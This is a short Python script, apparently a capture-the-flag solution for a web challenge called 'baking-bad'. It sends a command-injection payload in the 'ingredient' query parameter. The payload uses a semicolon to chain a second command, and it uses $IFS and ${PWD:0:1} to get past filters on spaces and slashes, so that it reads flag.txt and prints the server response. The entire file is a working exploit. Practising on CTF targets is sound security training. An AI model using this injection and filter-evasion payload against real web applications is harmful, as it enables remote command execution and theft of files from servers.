import requests

URL = "https://baking-bad-482443ddb3d4c3dc.challs.brunnerne.xyz/"
PAYLOAD = ";more${IFS}${PWD:0:1}flag.txt"

def get_flag():
    params = {"ingredient": PAYLOAD}
    r = requests.get(URL, params=params)
    if r.status_code == 200:
        print("[+] Respuesta del servidor:\n")
        print(r.text)
    else:
        print("[-] Error HTTP:", r.status_code)

if __name__ == "__main__":
    get_flag()


